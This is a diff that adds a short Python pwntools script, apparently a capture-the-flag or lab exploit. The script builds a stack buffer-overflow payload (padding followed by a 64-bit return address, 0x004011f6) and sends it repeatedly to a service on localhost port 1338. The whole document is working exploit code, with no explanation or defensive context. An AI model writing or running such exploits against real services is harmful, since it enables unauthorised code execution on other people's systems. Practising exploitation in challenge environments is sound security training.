@@ -1,0 +1,16 @@
+import pwn
+
+payload = b"A"*68 + b"BBBB" + pwn.p64(0x004011f6)
+p = pwn.remote("localhost", 1338)
+p.recvline()
+p.sendline(payload)
+p.sendline(payload)
+p.sendline(payload)
+p.sendline(payload)
+p.recvline()
+p.recvline()
+p.recvline()
+p.recvline()
+p.recvline()
+p.recvline()
+p.close()
